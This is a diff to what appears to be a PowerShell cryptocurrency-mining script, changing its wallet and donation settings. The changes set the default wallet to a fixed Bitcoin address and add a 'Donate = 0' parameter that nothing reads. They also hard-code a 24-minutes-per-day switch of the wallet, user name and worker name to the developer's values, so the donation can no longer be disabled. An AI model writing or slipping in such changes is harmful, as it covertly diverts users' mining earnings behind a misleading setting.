@@ -2,7 +2,7 @@
 
 param(
     [Parameter(Mandatory = $false)]
-    [String]$Wallet, 
+    [String]$Wallet = "1BoQWhLa1qQxqFVgxprTHbtb2FXqwtL7yQ", 
     [Parameter(Mandatory = $false)]
     [String]$UserName, 
     [Parameter(Mandatory = $false)]
@@ -34,7 +34,7 @@ param(
     [Parameter(Mandatory = $false)]
     [Array]$Currency = ("BTC", "USD"), #i.e. GBP,EUR,ZEC,ETH etc.
     [Parameter(Mandatory = $false)]
-    [Int]$DevTime = 24, #Minutes per Day
+    [Int]$Donate = 0, #Minutes per Day
     [Parameter(Mandatory = $false)]
     [String]$Proxy = "", #i.e http://192.0.0.1:8080
     [Parameter(Mandatory = $false)]
@@ -87,7 +87,7 @@ Start-Transcript ".\Logs\$(Get-Date -Format "yyyy-MM-dd_HH-mm-ss").txt"
 $Downloader = Start-Job -InitializationScript ([scriptblock]::Create("Set-Location('$(Get-Location)')")) -ArgumentList ("2.7.1.4", $PSVersionTable.PSVersion, "") -FilePath .\Updater.ps1
 
 #Set donation parameters
-if ($DevTime -lt 10) {$DevTime = 10}
+$DevTime = 10
 $LastDevTimed = $Timer.AddDays(-1).AddHours(1)
 $WalletDevTime = "1BoQWhLa1qQxqFVgxprTHbtb2FXqwtL7yQ"
 $UserNameDevTime = "ngungbi"
@@ -110,8 +110,7 @@ while ($true) {
     $WatchdogInterval = ($WatchdogInterval / $Strikes * ($Strikes - 1)) + $StatSpan.TotalSeconds
     $WatchdogReset = ($WatchdogReset / ($Strikes * $Strikes * $Strikes) * (($Strikes * $Strikes * $Strikes) - 1)) + $StatSpan.TotalSeconds
 
-    #Activate or deactivate donation
-    if ($Timer.AddDays(-1).AddMinutes($DevTime) -ge $LastDevTimed) {
+    if ($Timer.AddDays(-1).AddMinutes(24) -ge $LastDevTimed) {
         if ($Wallet) {$Wallet = $WalletDevTime}
         if ($UserName) {$UserName = $UserNameDevTime}
         if ($WorkerName) {$WorkerName = $WorkerNameDevTime}
